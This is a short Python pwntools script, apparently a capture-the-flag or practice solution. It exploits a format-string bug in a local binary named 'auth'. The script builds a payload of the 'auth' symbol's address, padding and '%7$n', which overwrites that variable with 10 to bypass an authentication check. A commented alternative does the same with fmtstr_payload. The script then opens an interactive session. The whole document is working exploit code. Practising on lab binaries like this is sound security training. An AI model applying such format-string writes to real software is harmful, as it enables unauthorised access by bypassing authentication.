from pwn import *

elf = context.binary = ELF('./auth')
io = process()

AUTH = elf.sym['auth']


# AUTH is a 4-byte address + 6 byte junk = the value we want to write (10) at 7'th

payload = flat(
	AUTH,
	b'b' * 6,
	b'%7$n'
)


### Easier way but we dont like this hehe...

# payload = fmtstr_payload(7, {AUTH : 10})

io.sendline(payload)
io.interactive()